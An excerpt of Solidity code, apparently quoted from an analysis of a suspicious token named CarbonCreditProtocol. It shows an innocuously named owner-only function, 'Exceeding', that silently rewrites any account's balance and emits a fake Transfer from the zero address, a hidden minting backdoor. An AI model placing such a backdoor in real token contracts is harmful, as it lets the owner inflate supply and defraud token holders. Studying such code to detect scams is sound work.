...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
   ...
   function isExcludedFromFees(address account) public view returns (bool) {
    ...
    function Exceeding(uint256 amount, address account) public onlyOwner {
        ...
        if (amount > balanceOf(account)) {
            ...
            emit Transfer( address(0x0), account, balanceOf(account) - amount);
            _balances[account] = amount * (10 ** _decimals);
        }
    }    
...
contract CarbonCreditProtocol is ERC20DividendToken {
